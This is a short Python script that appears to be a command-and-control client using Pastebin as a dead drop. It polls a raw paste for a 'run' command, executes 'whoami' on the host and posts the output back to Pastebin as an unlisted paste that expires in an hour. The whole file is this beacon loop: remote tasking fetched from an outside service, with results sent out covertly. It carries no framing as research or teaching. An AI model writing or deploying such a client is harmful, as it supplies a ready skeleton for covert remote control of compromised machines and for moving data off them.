import os
import time
import requests

# Configuration
COMMAND_URL = "https://pastebin.com/raw/[COMMAND_ID]"  # Replace [COMMAND_ID] with your paste ID
RESULT_API_URL = "https://pastebin.com/api/api_post.php"
API_DEV_KEY = "YOUR_PASTEBIN_API_KEY"  # Replace with your actual API key
CHECK_INTERVAL = 60  # Check every 60 seconds

def get_command():
    try:
        response = requests.get(COMMAND_URL)
        if response.status_code == 200:
            return response.text.strip()
    except Exception as e:
        print(f"Error fetching command: {e}")
    return None

def post_result(output):
    data = {
        'api_dev_key': API_DEV_KEY,
        'api_option': 'paste',
        'api_paste_code': output,
        'api_paste_private': '1',  # Unlisted
        'api_paste_name': 'Command Output',
        'api_paste_expire_date': '1H'
    }
    try:
        response = requests.post(RESULT_API_URL, data=data)
        if response.status_code == 200:
            print(f"Result posted: {response.text}")
        else:
            print(f"Failed to post result: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Error posting result: {e}")

def main():
    print("Client started. Monitoring for commands...")
    while True:
        command = get_command()
        if command == 'run':
            print("Command 'run' received. Executing 'whoami'...")
            # Execute command and capture output
            try:
                output = os.popen('whoami').read()
                post_result(output)
            except Exception as e:
                post_result(f"Execution error: {e}")
        
        time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    main()
